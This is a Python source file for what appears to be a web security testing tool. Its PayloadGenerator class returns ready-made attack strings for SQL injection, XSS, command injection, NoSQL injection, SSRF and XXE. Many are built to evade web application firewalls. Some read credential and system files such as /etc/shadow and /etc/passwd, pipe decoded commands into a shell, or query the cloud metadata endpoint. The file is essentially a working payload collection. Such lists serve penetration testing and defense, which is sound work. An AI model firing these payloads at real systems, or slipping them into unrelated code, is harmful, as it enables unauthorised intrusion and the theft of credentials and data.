class PayloadGenerator:
    """
    A central generator for advanced security testing payloads.
    Provides various attack vectors designed to bypass basic WAFs and test edge cases.
    """

    @staticmethod
    def get_sqli_payloads():
        """
        Returns advanced SQL Injection payloads.
        Includes error-based, union-based, and time-based techniques.
        """
        return [
            # Basic bypasses
            "' OR 1=1--",
            "admin'--",
            "1' OR '1'='1",
            
            # Error-based and logic errors
            "' OR 'x'='x",
            "' AND 1=0 UNION ALL SELECT",
            "1 OR 1=1 LIMIT 1",
            
            # WAF bypasses (space evasion, comment evasion, null byte)
            "'/**/OR/**/1=1/**/--",
            "1'/*!50000OR*/1='1",
            "1' || '1'='1",
            "admin' %00",
            
            # Time-based blind (MySQL, PostgreSQL, MSSQL)
            "1; WAITFOR DELAY '0:0:5'--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND pg_sleep(5)--",
            
            # Type conversion and boolean blind
            "1 AND 1=CAST((SELECT table_name FROM information_schema.tables) AS int)",
            "' OR 1=1#",
            "1' OR true--",
            "1' AND (SELECT 1 FROM DUAL WHERE 1=1)--"
        ]

    @staticmethod
    def get_xss_payloads():
        """
        Returns advanced Cross-Site Scripting (XSS) payloads.
        Includes DOM, Reflected, and obfuscated payloads.
        """
        return [
            # Basic vectors
            "<script>alert('API_Sentinel_XSS')</script>",
            "\"><img src=x onerror=prompt('XSS')>",
            
            # Event handlers
            "<svg onload=alert(1)>",
            "<body onload=alert('XSS')>",
            "\" onmouseover=\"alert(1)",
            
            # Obfuscated / encoded
            "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
            "<iframe src=\"javascript:alert(1)\">",
            "<object data=\"javascript:alert(1)\">",
            "javascript://%250Aalert(1)",
            
            # Bypassing basic filters (mixed case, nested tags)
            "<sCripT>alert(1)</sCripT>",
            "<<script>alert(1);//<</script>",
            "<scr<script>ipt>alert(1)</script>",
            
            # Template Injection (Vue/Angular style)
            "{{7*7}}",
            "${7*7}",
            "{{constructor.constructor('alert(1)')()}}",
            
            # Polyglots
            "\">><script>alert(1)</script><img src=x onerror=alert(1)>",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
        ]

    @staticmethod
    def get_cmd_injection_payloads():
        """
        Returns advanced Command Injection payloads.
        Includes direct execution, blind/time-based execution, and out-of-band checks.
        """
        return [
            # Basic separators
            "; id",
            "| whoami",
            "& uname -a",
            
            # Blind/Time-based
            "`ping -c 5 127.0.0.1`",
            "| ping -n 5 127.0.0.1",
            "; sleep 5",
            
            # WAF bypasses (no spaces, variable expansion, Windows specific)
            ";id",
            ";${IFS}id",
            "|cat${IFS}/etc/passwd",
            "^p^i^n^g -n 5 127.0.0.1",
            
            # Backticks and subshells
            "$(whoami)",
            "`id`",
            
            # Base64 encoded payload execution (echo 'id' | base64)
            "; echo aWQ= | base64 -d | sh",
            
            # Data exfiltration/read targets
            "; cat /etc/passwd",
            "; type C:\\Windows\\win.ini",
            "| cat /etc/shadow"
        ]

    @staticmethod
    def get_nosql_payloads():
        """
        Returns NoSQL Injection payloads (MongoDB, CouchDB, etc.)
        Useful for bypassing login or data extraction.
        """
        return [
            # MongoDB bypasses
            {"$gt": ""},
            {"$ne": None},
            {"$ne": 1},
            
            # Array bypasses
            {"$in": ["admin", "root"]},
            
            # JavaScript Injection (where operator)
            {"$where": "sleep(5000)"},
            {"$where": "this.password == this.password"}
        ]
        
    @staticmethod
    def get_ssrf_payloads():
        """
        Returns Server-Side Request Forgery (SSRF) payloads.
        Attempts to access internal cloud metadata or local loopback.
        """
        return [
            # Localhost variants
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://127.1",
            "http://[::1]",
            
            # AWS / Cloud Metadata IP
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            
            # Internal network ranges
            "http://10.0.0.1",
            "http://192.168.0.1",
            "http://172.16.0.1"
        ]
        
    @staticmethod
    def get_xxe_payloads():
        """
        Returns XML External Entity (XXE) payloads.
        Used to test endpoints that consume XML data.
        """
        return [
            # Basic file read
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
            
            # Windows file read
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>",
            
            # SSRF via XXE
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\" >]><foo>&xxe;</foo>"
        ]
